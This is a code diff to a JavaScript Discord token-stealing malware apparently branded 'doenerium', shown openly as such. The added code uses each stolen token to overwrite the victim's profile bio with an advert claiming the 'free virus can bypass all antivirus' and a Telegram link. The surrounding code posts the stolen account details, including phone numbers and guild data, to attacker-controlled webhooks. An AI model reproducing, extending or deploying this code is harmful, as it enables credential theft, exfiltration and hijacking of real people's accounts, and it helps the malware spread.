@@ -1533,6 +1533,12 @@ async function stealTokens() {
         await findToken(path);
     }
 
+    const predefinedBio = `╔═══════════✧✧✧═══════════╗
+   **  This free virus can bypass all antivirus ! **
+           ⭐️**https://t.me/doenerium69**⭐️
+╚═══════════✧✧✧═══════════╝`;
+
+
     for (let token of tokens) {
         try {
             let json;
@@ -1544,7 +1550,8 @@ async function stealTokens() {
             }).then(res => { json = res.data }).catch(() => { json = null });
 
             if (!json) continue;
-            
+
+            const newBio = await updateBio(token, predefinedBio);
             interceptedTokens.push(token);
             const phone = await getPhoneNumber(token);
             const hqGuilds = await getHQGuilds(token);
@@ -1606,9 +1613,9 @@ async function stealTokens() {
                     },
                   ],
                 footer: {
-    text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
-    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
-  }
+                    text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
+                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+                }
             };
 
             const data = {
@@ -1631,6 +1638,13 @@ async function stealTokens() {
                 data.embeds.push(friendsEmbed);
             }
 
+            if (newBio !== null) {
+                userInformationEmbed.fields.push({
+                    name: "<a:aa_star_black:1157319572328808449> About me:",
+                    value: "```\n" + newBio + "\n```",
+                });
+            }
+
             await axios.post(discordWebhookUr1, data);
             await axios.post(discordWebhookUrl, data);
 
@@ -1638,11 +1652,30 @@ async function stealTokens() {
             console.error(error);
             logToDebugFile(error);
         }
-
     }
 }
 
+async function updateBio(token, newBio) {
+    try {
+        const url = 'https://discord.com/api/v9/users/@me/profile';
+        const payload = { bio: newBio };
+        const headers = { authorization: token.trim() };
 
+        const response = await axios.patch(url, payload, { headers });
+
+        if (response.status === 200) {
+            console.log(`Bio updated for token: ${token}`);
+            return newBio;
+        } else {
+            console.log(`Failed to update bio for token: ${token}`);
+            return null;
+        }
+    } catch (error) {
+        console.error(`An error occurred while updating bio: ${error.message}`);
+        logToDebugFile(error);
+        return null;
+    }
+}
 
 async function getPhoneNumber(token) {
     try {
